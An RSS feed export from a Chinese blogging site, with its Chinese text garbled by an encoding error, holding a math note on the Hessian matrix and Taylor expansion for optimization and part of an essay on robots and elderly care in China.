<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-19T04:17:38.808Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼ ]]></title>
    <link>https://www.cnblogs.com/GeophysicsWorker/p/19624189</link>
    <guid>c7519c70928cf4e87c4c894245c6519b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GeophysicsWorker/p/19624189" title="åå¸äº 2026-02-19 09:48">
    <span role="heading" aria-level="2">å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        ä¸ä¸èè¯´è¿ï¼æ¢¯åº¦ $\nabla f(\mathbf{X})$ æ¯$f(\mathbf{X})$ å³äº$\mathbf{X}$ çä¸é¶å¯¼æ°ï¼ç°å¨ä¸ä¸ªé®é¢$f(\mathbf{X})$ å³äº $\mathbf{X}$ çäºé¶å¯¼æ°æ¯ä»ä¹ï¼Hessian ç©éµï¼æµ·æ£®ç©éµï¼æ¯ä¸ä¸ªå¤åéå®å¼å½æ°$f(\mathbf{X})$çäºé¶å¯¼æ°ææå¾æ¹éµï¼å¶å ä½æä¹æ¯æè¿°äºä¸ä¸ªå¤åå½æ°æåºå½æ°çå±é¨æ²çãå¨æºå¨å­¦ä¹ ãä¼åé®é¢åç©çåæ¼é®é¢ä¸­ï¼Hessianç©éµæ®æ¼çéè¦çè§è²ï¼å°¤å¶æ¯å¨å¯»æ¾å½æ°çæå¼ç¹ï¼å¦æå¤±å½æ°æç®æ å½æ°çæå°å¼ï¼ååæç³»ç»çç¨³å®æ§ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="1hessianç©éµå®ä¹åæ§è´¨">1.Hessianç©éµå®ä¹åæ§è´¨</h2>
<p>â	å¨ä¸ä¸èè¯´è¿ï¼æ¢¯åº¦ <span class="math inline">\(\nabla f(\mathbf{X})\)</span> æ¯<span class="math inline">\(f(\mathbf{X})\)</span> å³äº<span class="math inline">\(\mathbf{X}\)</span> çä¸é¶å¯¼æ°ï¼ç°å¨ä¸ä¸ªé®é¢<span class="math inline">\(f(\mathbf{X})\)</span> å³äº <span class="math inline">\(\mathbf{X}\)</span> çäºé¶å¯¼æ°æ¯ä»ä¹ï¼Hessian ç©éµï¼æµ·æ£®ç©éµï¼æ¯ä¸ä¸ªå¤åéå®å¼å½æ°<span class="math inline">\(f(\mathbf{X})\)</span>çäºé¶å¯¼æ°ææå¾æ¹éµï¼å¶å ä½æä¹æ¯æè¿°äºä¸ä¸ªå¤åå½æ°æåºå½æ°çå±é¨æ²çãå¨æºå¨å­¦ä¹ ãä¼åé®é¢åç©çåæ¼é®é¢ä¸­ï¼Hessianç©éµæ®æ¼çéè¦çè§è²ï¼å°¤å¶æ¯å¨å¯»æ¾å½æ°çæå¼ç¹ï¼å¦æå¤±å½æ°æç®æ å½æ°çæå°å¼ï¼ååæç³»ç»çç¨³å®æ§ãä¸é¢æ¯å³äºHessianç©éµçè¯¦ç»ä»ç»ï¼</p>
<p>â	<strong>Definition 4.1.1</strong>  è®¾<span class="math inline">\(f:\mathbb{R}^n\rightarrow{\mathbb{R}}\)</span> , <span class="math inline">\(\mathbf{X}\in{R}^n\)</span> ,å¦æ<span class="math inline">\(f\)</span>å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤å¯¹äºèªåé<span class="math inline">\(\mathbf{X}\)</span> çåä¸ªåé<span class="math inline">\(x_i,x_j\)</span> çäºé¶åå¯¼</p>
<p></p><div class="math display">\[\frac{\part{f(\mathbf{X}_0)}}{\part{x_i}\part{x_j}} 		\hspace{2em} (i,j=1,2,...,n)
\]</div><p></p><p>é½å­å¨ï¼åç§°å½æ°<span class="math inline">\(f\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤äºé¶å¯å¯¼ï¼å¹¶ä¸ç§°ç©éµï¼</p>
<p></p><div class="math display">\[\nabla^2f(\mathbf{X}_0)=\left(\begin{matrix}\frac{\part^2f(\mathbf{X}_0)}{\part{x_1^2}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_n}}\\ 
\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_2}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_2^2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_2}\part{x_n}}\\
\cdots &amp;\cdots &amp;\cdots &amp;\cdots \\
\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}\part{x_1}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}\part{x_2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}^2}
\end{matrix}\right)
\tag{2}
\]</div><p></p><p>æ¯<span class="math inline">\(f\)</span>å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤ç<strong>Hessianç©éµ</strong>ï¼è®°ä¸º<span class="math inline">\(\mathbf{H}_{ij}=\frac{\part^2{f}}{\part{x_i}\part{x_j}}\)</span>ã</p>
<p>â	å¨æ°å­¦åæä¸­å·²ç»ç¥éï¼å½<span class="math inline">\(f\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤çææäºé¶åå¯¼æ°ä¸ºè¿ç»­æ¶æï¼</p>
<p></p><div class="math display">\[\frac{\part^2f(\mathbf{X}_0)}{\part{x_i}\part{x_j}}=\frac{\part^2{f(\mathbf{X}_0)}}{\part{x_j}\part{x_i}} \tag{3}
\]</div><p></p><p>å æ­¤ï¼å¨è¿ç§æåµä¸Hessianç©éµæ¯<strong>å¯¹ç§°ç©éµ</strong>ã</p>
<p><strong>æ¨è®º 1</strong> è®¾<span class="math inline">\(\mathbf{a}\in{\mathbf{R}^n},\mathbf{X}\in{\mathbf{R}^n},b\in{R}\)</span>ï¼æ±çº¿æ§å½æ°ï¼</p>
<p></p><div class="math display">\[f(\mathbf{X})=\mathbf{a}^T\mathbf{X}+b\tag{4}
\]</div><p></p><p>å¨ä»»æç¹<span class="math inline">\(\mathbf{X}\)</span> å¤çæ¢¯åº¦åéåHessianç©éµï¼</p>
<p></p><div class="math display">\[\begin{aligned}
&amp;\nabla{f(\mathbf{X})}=\mathbf{a}\\
&amp;\nabla^2{f(\mathbf{X})}=\mathbf{0}
\end{aligned}
\tag{5}
\]</div><p></p><p><strong>è¯  æï¼</strong> è®¾<span class="math inline">\(\mathbf{a}=[a_1,a_2,\cdots,a_n]^{T},\mathbf{X}=[x_1,x_2,\cdots,x_n]^{T}\)</span> åï¼</p>
<p></p><div class="math display">\[f(x_1,x_2,\cdots,x_n)=\sum^{n}_{i=1}a_ix_i+b \tag{6}
\]</div><p></p><p>æ ¹æ®æ¢¯åº¦åé<span class="math inline">\(\nabla{f}\)</span>çå®ä¹ï¼</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\frac{\part{f}}{\part{x_i}}=a_i \hspace{2em} (i=1,2,\cdots,n) \tag{7}
\]</div><p></p><p>ç±å¼ï¼7ï¼å¯ç¥ï¼</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=[a_1,a_2,\cdots,a_n]^T=\mathbf{a} \tag{8}
\]</div><p></p><p>æ ¹æ®å¼ï¼2ï¼ç<span class="math inline">\(Hessian\)</span>ç©éµçå®ä¹ï¼</p>
<p></p><div class="math display">\[\frac{\part^2{f}}{\part{x_i}\part{x_j}}=0, \hspace{2em} i,j=1,2,\cdots,n \tag{9}
\]</div><p></p><p>æä»¥ï¼</p>
<p></p><div class="math display">\[\nabla^2{f(\mathbf{X})}=\mathbf{0} \tag{10}
\]</div><p></p><p><strong>æ¨è®º  2</strong>  è®¾<span class="math inline">\(\mathbf{A}\in{R^{n\times{n}}}\)</span> æ¯å¯¹ç§°å®æ¹éµï¼<span class="math inline">\(\mathbf{b}\in{\mathbf{R}^n},c\in\mathbf{R}^1\)</span> ,å¶äºæ¬¡å½æ°<span class="math inline">\(f(\mathbf{X})=\frac{1}{2}\mathbf{X}^T\mathbf{A}\mathbf{X}+\mathbf{b}^T\mathbf{X}+c\)</span> ,å¨ä»»æç¹å¤çæ¢¯åº¦åé<span class="math inline">\(\nabla{f(\mathbf{X})}\)</span> åHessianç©éµ <span class="math inline">\(\nabla^2f(\mathbf{X})\)</span> ä¸ºå¦ä¸å½¢å¼ï¼</p>
<p></p><div class="math display">\[\begin{aligned}
&amp;\nabla{f}=\mathbf{AX+b} \\
&amp;\nabla^2{f}=\mathbf{A}
\end{aligned}
\tag{11}
\]</div><p></p><p><strong>è¯ æï¼</strong> è®¾<span class="math inline">\(\mathbf{A}=[a_{ij}]_{n\times{n}}\)</span> ,<span class="math inline">\(\mathbf{X}=[x_1,x_2,...,x_n]^T\)</span>, <span class="math inline">\(\mathbf{b}=[b_1,b_2,...,b_n]^T\)</span> ,äºæ¬¡å½æ°<span class="math inline">\(f(\mathbf{X})\)</span> å¯ä»¥åæå¦ä¸å½¢å¼ï¼</p>
<p></p><div class="math display">\[f(x_1,x_2,\cdots,x_n)=\frac{1}{2}\sum_{i=1}^{n}\sum_{j=1}^{n}a_{ij}x_ix_j+\sum_{i=1}^{n}b_ix_i+c \tag{12}
\]</div><p></p><p>å°å®å¯¹åä¸ªåé <span class="math inline">\(x_i\)</span> (<span class="math inline">\(i=1,\cdots,n\)</span>) æ±åå¯¼æ°ï¼å¾å°ï¼</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\left( \begin{matrix} \sum_{j=1}^n a_{1j}x_j+b_1\\
\vdots \\\sum_{j=1}^{n}a_{n_j}x_j+b_n \end{matrix} \right)= \left(\begin{matrix}\sum_{j=1}^{n}a_{1j}x_j\\\vdots\\\sum_{j=1}^na_{nj}x_j\end{matrix}\right)+\left(\begin{matrix}b_1\\ \vdots \\b_n\end{matrix}\right) \tag{13}
\]</div><p></p><p>æä»¥ï¼</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\mathbf{AX+b} \tag{14}
\]</div><p></p><p>åå¯¹å®ä»¬çæ±åå¯¼æ°æ¯ï¼</p>
<p></p><div class="math display">\[ \frac{\part{f(\mathbf{X})}}{\part{x_i}\part{x_j}}=a_{ij} \tag{15}
\]</div><p></p><p>æä»¥ï¼</p>
<p></p><div class="math display">\[\nabla^2f(\mathbf{X})=\mathbf{A} \tag{16}
\]</div><p></p><p>ä»¥ä¸ä¸¤ä¸ªä¾å­è¯´æï¼<span class="math inline">\(n\)</span>åå½æ°æ±å¯¼ä¸ä¸åå½æ°æ±å¯¼å¨å½¢å¼ä¸ä¸è´çï¼å³çº¿æ§å½æ°çä¸é¶å¯¼æ°çæ±å¯¼ä¸ºå¸¸åéï¼å¶äºé¶å¯¼æ°ä¸ºé¶ç©éµï¼èäºæ¬¡å½æ°çä¸é¶å¯¼æ°ä¸ºçº¿æ§åéå½æ°ï¼ å¶äºé¶å¯¼æ°ä¸ºå¸¸ç©éµã</p>
<p>â	å¨æ­¤ä»ç»å¨ä»åçè®¡ç®ä¸­è¦ç¨å°çåéå½æ°çå¯¼æ°ã</p>
<p>â	<strong>Definition 4.1.2</strong> è®¾ä¸ä¸ªåéå½æ°<span class="math inline">\(h:R^{n}\rightarrow{R^m}ï¼\mathbf{X}_0\in{R^n}\)</span>ï¼è®°<span class="math inline">\(h(\mathbf{X})=\{h_1(\mathbf{X}),h_2(\mathbf{X}),\cdots,h_m(\mathbf{X})\}^T\)</span>ï¼å¦æ<span class="math inline">\(h_i(i=1,2,\cdots,m)\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤å¯¹äºèªåé<span class="math inline">\(\mathbf{X}=[x_1,x_2,x_3,\cdots,x_n]^T\)</span> çååéçåå¯¼æ°<span class="math inline">\(\frac{\part{h_i(\mathbf{X}_0)}}{\part{x_j}}\space(j=1,2,3,\cdots,m)\)</span> é½å­å¨ï¼åç§°åéå½æ°<span class="math inline">\(h(\mathbf{X})\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤æ¯ä¸é¶å¯å¯¼çï¼å¹¶ä¸ç§°ç©éµï¼</p>
<p></p><div class="math display">\[\nabla_{m\times{n}}h(\mathbf{X}_0)=\left[\begin{matrix} \frac{\part{h_1(\mathbf{X}_0)}}{\part{x_1}} &amp;\frac{\part{h_1(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_1(\mathbf{X}_0)}}{\part{x_n}} \\ \frac{\part{h_2(\mathbf{X}_0)}}{\part{x_1}} &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_n}}\\ \cdots &amp;\cdots &amp;\cdots &amp;\cdots \\ \frac{\part{h_m(\mathbf{X}_0)}}{\part{x_1}}   &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_n}} \end{matrix}\right] \tag{17}
\]</div><p></p><p>æ¯<span class="math inline">\(h\)</span>å¨ç¹<span class="math inline">\(X_0\)</span> å¤çä¸é¶å¯¼æ°æJacobi ç©éµï¼ç®è®°ä¸º</p>
<p></p><div class="math display">\[\nabla{\mathbf{h}(\mathbf{X}_0)}=\nabla_{m\times{n}}\mathbf{h}(\mathbf{X}_0) \tag{18}
\]</div><p></p><p>ç±äº<span class="math inline">\(n\)</span>åå½æ°<span class="math inline">\(f:\mathbf{R}^n\rightarrow \mathbf{R}^1\)</span> çæ¢¯åº¦æ¯åéå½æ°:</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\left[\frac{\part{f(\mathbf{X})}}{\part{x_1}},...,\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right]^T 
\tag{19}
\]</div><p></p><p>æä»¥<span class="math inline">\(\nabla f(\mathbf{X})\)</span> çä¸é¶å¯¼æ°æJacobi ç©éµä¸ºï¼</p>
<p></p><div class="math display">\[\begin{aligned}
\nabla_{n\times{n}}\nabla{f(\mathbf{X})}&amp;=\left[\begin{matrix}\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right)\\
\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right)\\
\cdots &amp;\cdots &amp;\cdots &amp;\cdots \\
\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right)
\end{matrix}\right]\\
&amp;=\left[\begin{matrix}\frac{\part^2{f(\mathbf{X})}}{\part{x_1^2}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_2}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_n}}\\
\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_2}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2^2}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2x_n}}\\
\cdots &amp;\cdots &amp;\cdots &amp;\cdots\\
\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_n}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2x_n}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_n^2}}
\end{matrix}\right]\\
&amp;=\nabla^2{f(\mathbf{X})}
\end{aligned}
\tag{20}
\]</div><p></p><p>å³ï¼</p>
<p></p><div class="math display">\[\nabla_{n\times{n}}\nabla{f(\mathbf{X})}=\nabla^2f(\mathbf{X}) \tag{21}
\]</div><p></p><p>æ®æ­¤ï¼ä»ä¸å¼çå¾ç¥ï¼å½æ°æ¢¯åº¦çJacobiçç©éµä¸ºæ­¤å½æ°<span class="math inline">\(f(\mathbf{X})\)</span> çHessianç©éµã</p>
<p>ä¸é¢ç»åºå¸¸ç¨Jacobiç©éµçå ä¸ªå¬å¼åæ¨è®ºï¼</p>
<ol>
<li><span class="math inline">\(\nabla{\mathbf{c}_{n\times1}}=\mathbf{0}_{n\times{n}}\)</span> ï¼å¶ä¸­<span class="math inline">\(\mathbf{c}\)</span> æ¯åéå¨é¨ä¸ºå¸¸éç<span class="math inline">\(n\)</span>ç»´åéï¼<span class="math inline">\(\mathbf{0}\)</span> æ¯<span class="math inline">\(n\times{n}\)</span> é¶é¶åéï¼</li>
<li><span class="math inline">\(\nabla{\mathbf{X}}=\mathbf{I}\)</span>ï¼å¶ä¸­<span class="math inline">\(\mathbf{X}\)</span> æ¯<span class="math inline">\(n\)</span>ç»´åéï¼<span class="math inline">\(I\)</span> ä¸º<span class="math inline">\(n\times{n}\)</span> é¶åä½ç©éµï¼</li>
<li><span class="math inline">\(\nabla{\mathbf{AX}}=\mathbf{A}^T\)</span>ï¼å¶ä¸­<span class="math inline">\(\mathbf{A}\)</span>æ¯<span class="math inline">\(m\times{n}\)</span>é¶ç©éµï¼</li>
<li>è®¾ <span class="math inline">\(\phi{(t)}=f(\mathbf{X}_0+t\mathbf{P})\)</span>ï¼å¶ä¸­<span class="math inline">\(f:\mathbf{R}^n\rightarrow\mathbf{R}^{1}\)</span>, <span class="math inline">\(\phi:\mathbf{R}\rightarrow\mathbf{R}\)</span>ï¼å<span class="math inline">\(\phi^{\prime}(t)=\nabla f(\mathbf{X}_0+t\mathbf{P})^T\mathbf{P}\)</span>, <span class="math inline">\(\phi^{\prime\prime}=\mathbf{P}^T\nabla^2{f(\mathbf{X}_0+t\mathbf{P})}\mathbf{P}\)</span></li>
</ol>
<h2 id="2å¤åå½æ°çtaylorå±å¼">2.å¤åå½æ°çTaylorå±å¼</h2>
<p>â	å¤åå½æ°çTaylorå±å¼å¼å¨æä¼åæ¹æ³ä¸­æ¯ååéè¦çï¼è®¸å¤æ¹æ³åå¶æ¶ææ¹æ³çè¯ææ¯ä»å¶åºåï¼è¿éç»åºTaylorå±å¼å®çåå¶è¯æãTaylorå±å¼è¿ä¼¼å¯ä»¥ææå°å°å¤æå½æ°åä¸ºäºæ¬¡å½æ°ã</p>
<p>â	<strong>å® ç 4.2.1</strong> è®¾<span class="math inline">\(f:\mathbf{R}^{n}\rightarrow\mathbf{R}\)</span> å·æäºé¶è¿ç»­åå¯¼æ°ï¼å</p>
<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^T\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\overline{\mathbf{X}})\mathbf{P} \tag{22}
\]</div><p></p><p>å¶ä¸­ï¼<span class="math inline">\(\overline{\mathbf{X}}=\mathbf{X}+\theta\mathbf{P}(\theta\in{(0,1)})\)</span>ã</p>
<p><strong>è¯  æ</strong>ï¼è®¾ <span class="math inline">\(\psi(t)=f(\mathbf{X}+t\mathbf{P})\)</span> å¶ä¸­ <span class="math inline">\(t\in[0,1]\)</span>:</p>
<p></p><div class="math display">\[\psi(0)=f(\mathbf{X}) ï¼ \psi(1)=f(\mathbf{X}+\mathbf{P}) \tag{23}
\]</div><p></p><p>å¯¹<span class="math inline">\(\psi(t)\)</span> æç§ä¸åå½æ°å¨<span class="math inline">\(t=0\)</span>ç¹å±å¼ï¼å¾å°ä¸å¼ï¼</p>
<p></p><div class="math display">\[   \psi(t)=\psi(0)+\psi^{\prime}(0)t+\frac{1}{2}\psi^{\prime\prime}(\theta t)t^2 \tag{24}
\]</div><p></p><p>å¶ä¸­ <span class="math inline">\(\theta\in(0,1)\)</span>ãä»¤<span class="math inline">\(t=1\)</span>ï¼äºæ¯</p>
<p></p><div class="math display">\[\psi(1)=\psi(0)+\psi^{\prime}(0)+\frac{1}{2}\psi^{\prime\prime}(\theta) \tag{25}
\]</div><p></p><p>åå ä¸ºä¸èä¸­ <span class="math inline">\(\psi^{\prime}(\theta)=\nabla{f(\mathbf{X})}^T\mathbf{P},\psi^{\prime\prime}(\theta)=\mathbf{P}^T\nabla^2f(\mathbf{X}+\theta{\mathbf{P}})\mathbf{P}\)</span> ï¼ä»£å¥å¼ï¼25ï¼ä¸­å¾å°ï¼</p>
<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^T\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\mathbf{X}+\theta\mathbf{P})\mathbf{P} \tag{26}
\]</div><p></p><p>å¼ï¼26ï¼è¿å¯ä»¥åæï¼</p>
<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^{T}\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\mathbf{X})\mathbf{P}+o(||\mathbf{P}||^2) \tag{27}
\]</div><p></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.002777777777777778" data-date-updated="2026-02-19 09:52">2026-02-19 09:48</span>&nbsp;
<a href="https://www.cnblogs.com/GeophysicsWorker">GeoFXR</a>&nbsp;
éè¯»(<span id="post_view_count">12</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19624189);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19624189', targetLink: 'https://www.cnblogs.com/GeophysicsWorker/p/19624189', title: 'å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä»æ¥ææºå¨äººï¼çä¸­å½æªæ¥ç¾å¹´çå»èä¹è·¯ ]]></title>
    <link>https://www.cnblogs.com/xdesigner/p/19621864</link>
    <guid>24efd1fb4993450849ff2cf974b5db81</guid>
    <description>
    <![CDATA[ 
		<h2>
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xdesigner/p/19621864" title="åå¸äº 2026-02-17 19:03">
    <span role="heading" aria-level="2">ä»æ¥ææºå¨äººï¼çä¸­å½æªæ¥ç¾å¹´çå»èä¹è·¯</span>
    

</a>

		</h2>
		<div class="postText">    <div id="cnblogs_post_description" style="display: none">
        
        æªæ¥ä¸ç¾å¹´ï¼ä¸­å½ä¼èµ°ä¸æ¡ï¼äººå£éåº¦ãç§æå¼ºå¤§ãäº§ä¸é«æãå»èæ®æ çéè·¯ãç§æè®©çæ´»æ´å®ç¨³ï¼è®©å»èæ´æå°ä¸¥ï¼è®©å½å®¶åå±æ´å¯æç»­ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ä»æ¥ææºå¨äººçä¸­å½æªæ¥ç¾å¹´çå»èä¹è·¯">ä»æ¥ææºå¨äººï¼çä¸­å½æªæ¥ç¾å¹´çå»èä¹è·¯</h1>
<p>2026å¹´æ¥æçæ­¦æ¯æºå¨äººèç®ï¼æ´é½åä¸çå¨ä½ãç¨³å®çå¹³è¡¡è½åï¼è®©äººå°è±¡æ·±å»ãèç®æ­åºåï¼ç¤¾äº¤åªä½ä¸åºç°å¤§éç­è®®ãä¸ä¸ªçªåºçå£°é³æ¯ï¼ä¸å°å¹´è½»äººçè¨å¹¶ç¸äºåå¤è®¨è®ºï¼âä»¥åä¸çå°å­©äºï¼æé±å­èµ·æ¥ï¼ç­èäºç´æ¥ä¹°æºå¨äººå»èãâ</p>
<p>è¿è¯ä¹å¬åç©ç¬ï¼ç»æ³å´å¾ææ·±æãå®è§¦åäºä¸ä¸ªæ­£å¨åççæ ¹æ¬ååï¼å½ç§æè¶³å¤åè¿ï¼ä¼ ç»çâå»å¿é²èâæ¨¡å¼ï¼æ­£å¨è¢«ä¸ç§æ°çå¯è½ææ¿ä»£ãä½è¿ç§æ¿ä»£ä¸ä¼ä¸è¹´èå°±ââå¨æºå¨äººçæ­£æ®åä¹åï¼ä¸­å½å°é¢ä¸´ä¸ä¸ª10å°20å¹´çâå±é©å¹³è¡¡æâã</p>
<h2 id="ä¸æªå¯åèæä»¬é¢ä¸´çç°å®åå">ä¸ãæªå¯åèï¼æä»¬é¢ä¸´çç°å®åå</h2>
<p>æ¥ææºå¨äººå±ç¤ºçè¿å¨æ§å¶åç²¾åæä½è½åï¼æ°æ°æ¯å»èåºæ¯ä¸­æéè¦çææ¯ãä½é®é¢çç´§è¿«æ§å¨äºï¼èé¾åæ­£å¨å éï¼èæºå¨äººææ¯å°æªå®å¨æçã</p>
<p>ä¸ç»æ°æ®å¯ä»¥è¯´æç°ç¶ï¼ç®åæå½60å²åä»¥ä¸äººå£å·²è¾¾3.1äº¿ï¼å æ»äººå£ç22%ãå¶ä¸­å¤±è½èäººçº¦3500ä¸ï¼èä¸ä¸æ¤çåçç¼ºå£è¶è¿500ä¸äººãé¢è®¡å°2030å¹´ï¼60å²ä»¥ä¸äººå£å°å¢è³3.9äº¿ï¼èé¾åæ°´å¹³æ¥è¿28%ã</p>
<p>ä¸åè¾¾å½å®¶âåå¯åèâä¸åï¼ä¸­å½æ¯âæªå¯åèâââäººåGDPåçªç ´1.2ä¸ç¾åï¼å°±è¿æ¥äºæ·±åº¦èé¾åãè¿æå³çï¼ç¤¾ä¼è´¢å¯ç§¯ç´¯ä¸è¶³ï¼å»èéä½ç³»ååå·¨å¤§ï¼èå¯ç¨çå¹´è½»å³å¨åæ­£å¨åå°ã</p>
<h2 id="äºæå±é©çåå¹´2026-2035å¹´çå¨æå¹³è¡¡">äºãæå±é©çåå¹´ï¼2026-2035å¹´çå¨æå¹³è¡¡</h2>
<p>è¿æ¯æ´ä¸ªç¾å¹´è¿ç¨ä¸­æå³é®çé¶æ®µï¼ä¹æ¯ä¸ä¸ªèå¼±çå¹³è¡¡æã</p>
<p><strong>ååæ¥èªä¸ä¸ªæ¹é¢ï¼</strong><br>
ç¬¬ä¸ï¼1960-1975å¹´åºççäººå£é«å³°æ­£å¨éä¸­è¿å¥éä¼åéè¦ç§æ¤çé¶æ®µï¼å»èæå¡éæ±çåå¼å¢é¿ã<br>
ç¬¬äºï¼æºå¨äººææ¯å°æªæçãç®åçäººå½¢æºå¨äººææ¬å¨10ä¸-20ä¸åä¸å°ï¼ä¸åªè½å®æè¾å©æ§å·¥ä½ï¼æ æ³æ¿ä»£å¤ææ¤çãå¤§è§æ¨¡æ®åè³å°è¦ç­å°2030å¹´ä»¥åã<br>
ç¬¬ä¸ï¼çè²çå·²ç»è·ç ´1.1ï¼è¿å¥å¨çæä½è¡åãè¿æå³çåç»­å³å¨äººå£è¡¥ç»ä¸¥éä¸è¶³ã</p>
<p><strong>è¿ä¸ªé¶æ®µçé£é©å¨äºï¼</strong></p>
<ul>
<li>å»èéæ¶æ¯ç¼ºå£æ©å¤§ï¼é¨åå°åºå¯è½é¢ä¸´æ¯ä»åå</li>
<li>æ¤çäººåç­ç¼ºå¯¼è´æå¡è´¨éä¸éï¼å¤±è½èäººç§æ¤åºç°çç©º</li>
<li>å¹´è½»äººæ¢è¦èµ¡å»èäººï¼åé¢ä¸´å°±ä¸ååï¼çè²ææ¿è¿ä¸æ­¥èµ°ä½</li>
<li>æºå¨äººæå¡ææ¬ä»ç¶åé«ï¼æ®éå®¶åº­é¾ä»¥è´æ</li>
</ul>
<p>è¿æ¯ä¸ä¸ªå¨æå¹³è¡¡ï¼æºå¨äººå¼å§è¿å¥å»èåºæ¯ï¼ä½æ¿ä»£çä¸è¶³ï¼äººå£èé¾åå éï¼ä½ç¤¾ä¼è½¬åå°æªå®æãç¨æåºå¯¹å¤±å½ï¼å°±å¯è½åºç°ç³»ç»æ§ååã</p>
<h2 id="ä¸åº¦è¿å±é©ææªæ¥ç¾å¹´çä¸é¶æ®µæ¼è¿">ä¸ãåº¦è¿å±é©æï¼æªæ¥ç¾å¹´çä¸é¶æ®µæ¼è¿</h2>
<h3 id="2035-2050æºå¨äººæ®åæ">2035-2050ï¼æºå¨äººæ®åæ</h3>
